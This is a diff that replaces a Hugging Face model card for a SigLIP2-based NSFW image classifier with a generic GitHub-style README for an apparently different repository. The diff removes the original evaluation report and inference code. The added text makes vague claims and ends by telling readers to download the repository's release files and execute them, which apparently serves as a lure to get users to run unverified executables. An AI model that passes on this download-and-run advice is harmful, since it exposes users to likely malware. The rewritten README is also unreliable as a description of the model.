@@ -1,129 +1,110 @@
-![cCWXMAl30EqsKqFXPIfC9.png](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/3cnuydT5poHDy8AUI7nl4.png)
+# NSFW Image Detection 🖼️🚫
 
-# **nsfw-image-detection**
+![GitHub Repo](https://img.shields.io/badge/GitHub-Repo-blue.svg) ![Releases](https://img.shields.io/badge/Releases-latest-orange.svg)
 
-nsfw-image-detection is a vision-language encoder model fine-tuned from siglip2-base-patch16-256 for multi-class image classification. Built on the SiglipForImageClassification architecture, the model is trained to identify and categorize content types in images, especially for explicit, suggestive, or safe media filtering.
+Welcome to the **NSFW Image Detection** repository! This project focuses on detecting and categorizing explicit, suggestive, or safe media in images. It utilizes a vision-language encoder model fine-tuned from the `siglip2-base-patch16-256` architecture. 
 
-Original Model : https://huggingface.co/prithivMLmods/siglip2-x256-explicit-content
+## Table of Contents
 
----
+- [Overview](#overview)
+- [Features](#features)
+- [Installation](#installation)
+- [Usage](#usage)
+- [Model Training](#model-training)
+- [Contributing](#contributing)
+- [License](#license)
+- [Contact](#contact)
+- [Releases](#releases)
 
-## **Evals**
+## Overview
 
-```py
-Classification Report:
-                     precision    recall  f1-score   support
+The **NSFW Image Detection** model is designed to help developers and researchers filter and categorize image content effectively. It is built on the `SiglipForImageClassification` architecture and aims to provide a reliable solution for identifying inappropriate content. 
 
-      Anime Picture     0.8940    0.8718    0.8827      5600
-             Hentai     0.8961    0.8935    0.8948      4180
-             Normal     0.9100    0.8895    0.8997      5503
-        Pornography     0.9496    0.9654    0.9574      5600
-Enticing or Sensual     0.9132    0.9429    0.9278      5600
+This project can be particularly useful for applications that require content moderation, parental controls, or user-generated content platforms. 
 
-           accuracy                         0.9137     26483
-          macro avg     0.9126    0.9126    0.9125     26483
-       weighted avg     0.9135    0.9137    0.9135     26483
-```
+## Features
 
-![download.png](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/psonZ0OXSjqgLRDkFtRTh.png)
+- **Multi-class Classification**: The model can identify various content types, including explicit, suggestive, and safe media.
+- **Easy Integration**: Built with popular libraries like Hugging Face Transformers, making it easy to integrate into existing projects.
+- **User-friendly Interface**: Utilize Gradio for a simple web interface to interact with the model.
+- **High Accuracy**: Fine-tuned on a comprehensive dataset to ensure reliable detection results.
 
----
+## Installation
 
-# **Quick Start with Transformers🤗**
-
-
-## **Install Dependencies**
+To get started, you need to install the necessary dependencies. You can do this using pip. 
 
 ```bash
-!pip install transformers torch pillow gradio hf_xet
+pip install -r requirements.txt
 ```
 
----
+Make sure you have Python 3.6 or higher installed on your machine.
 
-## **Inference Code**
+## Usage
 
-```python
-import gradio as gr
-from transformers import AutoImageProcessor, SiglipForImageClassification
-from PIL import Image
-import torch
+To use the NSFW Image Detection model, follow these steps:
 
-# Load model and processor
-model_name = "strangerguardhf/nsfw_image_detection"  # Replace with your model path if needed
-model = SiglipForImageClassification.from_pretrained(model_name)
-processor = AutoImageProcessor.from_pretrained(model_name)
+1. **Clone the repository**:
+   ```bash
+   git clone https://github.com/pedropqv/nsfw-image-detection.git
+   cd nsfw-image-detection
+   ```
 
-# ID to Label mapping
-id2label = {
-    "0": "Anime Picture",
-    "1": "Hentai",
-    "2": "Normal",
-    "3": "Pornography",
-    "4": "Enticing or Sensual"
-}
+2. **Run the Gradio app**:
+   ```bash
+   python app.py
+   ```
 
-def classify_explicit_content(image):
-    image = Image.fromarray(image).convert("RGB")
-    inputs = processor(images=image, return_tensors="pt")
+3. **Access the web interface**: Open your browser and go to `http://localhost:7860` to start using the model.
 
-    with torch.no_grad():
-        outputs = model(**inputs)
-        logits = outputs.logits
-        probs = torch.nn.functional.softmax(logits, dim=1).squeeze().tolist()
+You can upload images and see the classification results in real-time.
 
-    prediction = {
-        id2label[str(i)]: round(probs[i], 3) for i in range(len(probs))
-    }
+## Model Training
 
-    return prediction
+If you're interested in training the model further, follow these steps:
 
-# Gradio Interface
-iface = gr.Interface(
-    fn=classify_explicit_content,
-    inputs=gr.Image(type="numpy"),
-    outputs=gr.Label(num_top_classes=5, label="Predicted Content Type"),
-    title="nsfw-image-detection",
-    description="Classifies images into explicit, suggestive, or safe categories (e.g., Hentai, Pornography, Normal)."
-)
+1. **Prepare your dataset**: Make sure your images are organized into folders based on their categories (e.g., explicit, suggestive, safe).
+  
+2. **Update the configuration file**: Modify the `config.yaml` file to point to your dataset.
 
-if __name__ == "__main__":
-    iface.launch()
-```
+3. **Start training**:
+   ```bash
+   python train.py
+   ```
 
+4. **Monitor the training process**: You can check the logs for any issues and track the training progress.
 
+5. **Save the model**: Once training is complete, make sure to save your model for future use.
 
----
-## **Demo Inference**
+## Contributing
 
-![Screenshot 2025-05-01 at 22-34-31 nsfw-image-detection.png](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/v_nyPFei3rdeQJBVn56Ku.png)
-![Screenshot 2025-05-01 at 22-37-39 nsfw-image-detection.png](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/e3CQaCqVQHGSCoElYAF2O.png)
-![Screenshot 2025-05-01 at 22-36-41 nsfw-image-detection(1).png](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/G33PB2O5l1hBu1vpQrUJ5.png)
-![Screenshot 2025-05-01 at 22-39-08 nsfw-image-detection(1).png](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/4dcdejxTtTlbwcKf4z-Ck.png)
-![Screenshot 2025-05-01 at 22-42-45 nsfw-image-detection(1).png](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/cCAOpVATVLDG470Yhcwvd.png)
-![Screenshot 2025-05-01 at 22-43-35 nsfw-image-detection(1).png](https://cdn-uploads.huggingface.co/production/uploads/65bb837dbfb878f46c77de4c/gC8EkppCTBP-EsPbCNGtJ.png)
+We welcome contributions! If you'd like to contribute to this project, please follow these steps:
 
----
+1. Fork the repository.
+2. Create a new branch for your feature or bug fix.
+3. Make your changes and commit them.
+4. Push your changes to your fork.
+5. Open a pull request.
 
-The model classifies each image into one of the following content categories:
+Please ensure your code follows the existing style and includes tests where applicable.
 
-```
-Class 0: "Anime Picture"  
-Class 1: "Hentai"  
-Class 2: "Normal"  
-Class 3: "Pornography"  
-Class 4: "Enticing or Sensual"
-```
----
+## License
 
-## **Trained Models on This Dataset**
+This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.
 
-Several models have been trained using the NSFW\_MultiDomain dataset:
+## Contact
 
-Dataset Used : https://huggingface.co/datasets/strangerguardhf/NSFW-MultiDomain
+For questions or suggestions, feel free to open an issue or contact me directly.
 
-* 🔗 [https://huggingface.co/prithivMLmods/Mature-Content-Detection](https://huggingface.co/prithivMLmods/Mature-Content-Detection)
-* 🔗 [https://huggingface.co/prithivMLmods/siglip2-x256-explicit-content](https://huggingface.co/prithivMLmods/siglip2-x256-explicit-content)
-* 🔗 [https://huggingface.co/prithivMLmods/siglip2-x256p32-explicit-content](https://huggingface.co/prithivMLmods/siglip2-x256p32-explicit-content)
-* 🔗 [https://huggingface.co/strangerguardhf/nsfw\_image\_detector](https://huggingface.co/strangerguardhf/nsfw_image_detector)
+## Releases
 
-These models are fine-tuned on various architectures including SigLIP variants and custom classifiers for NSFW detection.
+You can find the latest releases of this project [here](https://github.com/pedropqv/nsfw-image-detection/releases). Download the necessary files and execute them to get started with the model.
+
+For more details on how to use the released versions, please refer to the documentation provided in the releases section.
+
+## Conclusion
+
+The **NSFW Image Detection** project offers a robust solution for identifying and categorizing explicit content in images. By utilizing state-of-the-art models and easy-to-use interfaces, this tool can help enhance content moderation across various platforms.
+
+Explore the repository, contribute, and help improve this valuable resource for the community. 
+
+Thank you for your interest!
